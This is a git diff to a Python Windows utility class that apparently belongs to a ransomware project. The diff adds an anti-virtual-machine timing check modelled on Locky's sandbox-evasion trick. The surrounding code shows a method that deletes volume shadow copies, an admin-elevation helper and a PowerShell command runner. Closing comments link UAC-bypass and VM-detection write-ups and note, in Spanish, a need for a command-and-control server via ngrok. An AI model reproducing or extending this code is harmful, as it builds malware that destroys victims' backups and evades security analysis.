@@ -4,7 +4,8 @@ import subprocess
 import oschmod
 import win32api
 import ctypes
-
+import winreg
+import time
 
 class Utils:
     """
@@ -116,6 +117,7 @@ class Utils:
             raise Exception("Not running in Windows System")
 
 
+    # TODO deprecated
     def run_as_admin(self, argv=None, debug=False):
         if argv is None:
             raise ValueError("argv is None")
@@ -136,7 +138,6 @@ class Utils:
 
         if int(ret) <= 32:
             raise Exception("Command not executed")
-
 
     def delete_shadowcopies(self):
         completed = subprocess.Popen(
@@ -194,11 +195,28 @@ class Utils:
             winreg.CloseKey(reg)
 
 
-    # ERASE
+    # TODO deprecated
     def run_command(self, cmd):
         completed = subprocess.run(
             ["powershell", "-Command", cmd], capture_output=True)
         return completed
+
+    """
+    Return false if we are running on a virtualized environment
+    """
+    def pass_vm_check(self):
+        for i in range(10):
+            t1 = time.perf_counter()
+            ctypes.windll.kernel32.GetProcessHeap()
+
+            t2 = time.perf_counter()
+            win32api.CloseHandle(0)
+
+            t3 = time.perf_counter()
+
+            if (((t3-t2)/(t2-t1)) >= 10):
+                return True
+        return False
 
 
 """
@@ -255,3 +273,13 @@ class Utils:
 # https://www.youtube.com/watch?v=UoMzCyB2IvE
 # read this https://www.xataka.com/basics/copias-seguridad-windows-10-sirven-que-tipos-hay-como-se-hacen
 # https://techpress.net/volume-shadow-copy-troubleshooting-delete-existing-shadow-copies-on-windows-server-using-command-line-vssadmin-command-examples-use-of-diskshadow-command/
+# https://hardsoftsecurity.es/index.php/2019/12/19/uac-bypass-windows-10/
+
+# HOW Locky DETECT VM ENV
+# https://www.forcepoint.com/blog/x-labs/locky-returned-new-anti-vm-trick
+# https://www.hackplayers.com/2019/02/deteccion-de-VMs-y-contramedidas.html
+# https://www.gdatasoftware.com/blog/2020/05/36068-current-use-of-virtual-machine-detection-methods
+
+# TODO Necesito un C&C
+# https://sdos.es/blog/ngrok-una-herramienta-con-la-que-hacer-publico-tu-localhost-de-forma-facil-y-rapida
+# https://ngrok.com/docs
